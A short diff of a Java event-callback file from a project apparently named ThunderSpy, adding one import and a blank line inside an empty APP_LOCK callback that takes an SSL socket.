@@ -1,5 +1,6 @@
 package com.thunderspy.spy.utils.etp;
 
+import com.thunderspy.spy.utils.ApplicationContextManager;
 import com.thunderspy.spy.utils.ThreadPoolManager;
 
 import java.util.HashMap;
@@ -19,6 +20,7 @@ public final class EventCallbacks {
         callbacks.put(EventCodes.SpyEvents.APP_LOCK, new EventCallback() {
             @Override
             public void run(SSLSocket socket, HashMap<String, String> headers, byte[] data) {
+
             }
         });
 
